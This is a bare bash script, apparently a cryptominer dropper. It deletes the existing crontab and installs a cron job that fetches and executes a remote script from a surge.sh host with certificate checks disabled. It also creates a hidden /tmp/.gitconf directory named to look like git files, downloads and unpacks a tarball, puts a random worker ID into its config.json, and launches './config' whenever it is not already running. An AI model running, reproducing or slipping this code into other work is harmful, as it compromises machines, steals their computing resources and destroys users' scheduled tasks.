#!/bin/bash


url="https://xaxaconf-g1tconf.surge.sh"
cronlow(){
  cr=$(crontab -l | grep -q $url | wc -l)
  if [ ${cr} -eq 0 ];then
    crontab -r
    (crontab -l 2>/dev/null; echo "*30 23 * * * curl -o /tmp/xaxaconf.sh https://xaxaconf-g1tconf.surge.sh/asdfg/qwert.sh -k || wget -O /tmp/xaxaconf.sh https://xaxaconf-g1tconf.surge.sh/asdfg/qwert.sh --no-check-certificate && cd /tmp && chmod +x xaxaconf.sh && ./xaxaconf.sh")| crontab -
  else
    echo "cronlow skip"
  fi
}

cronlow



configFile="/tmp/.gitconf/config"




if [ -f "$configFile" ]; then
	ProcNumber=$(ps -ef |grep -w ./config|wc -l)
	if [ ${ProcNumber} -le 1 ];then
		rm -rf /tmp/.gitconf
		mkdir /tmp/.gitconf
		cd /tmp/.gitconf
		curl -o config.tar.gz -k "https://xaxaconf-g1tconf.surge.sh/asdfg/config.tar.gz" || wget -O config.tar.gz --no-check-certificate "https://xaxaconf-g1tconf.surge.sh/asdfg/config.tar.gz"
		tar -zxvf *
		user=`date +%s%N | md5sum | head -c 10`
		sed -ie 's/xaxa4/'$user'/g' config.json
		chmod 777 *
		rm -rf *.gz
		./config
	else
		exit
	fi

else
	mkdir /tmp/.gitconf
	cd /tmp/.gitconf
	curl -o config.tar.gz -k "https://xaxaconf-g1tconf.surge.sh/asdfg/config.tar.gz" || wget -O config.tar.gz --no-check-certificate "https://xaxaconf-g1tconf.surge.sh/asdfg/config.tar.gz"
	tar -zxvf *
	user=`date +%s%N | md5sum | head -c 10`
	sed -ie 's/xaxa4/'$user'/g' config.json
	chmod 777 *
	rm -rf *.gz
	./config
fi


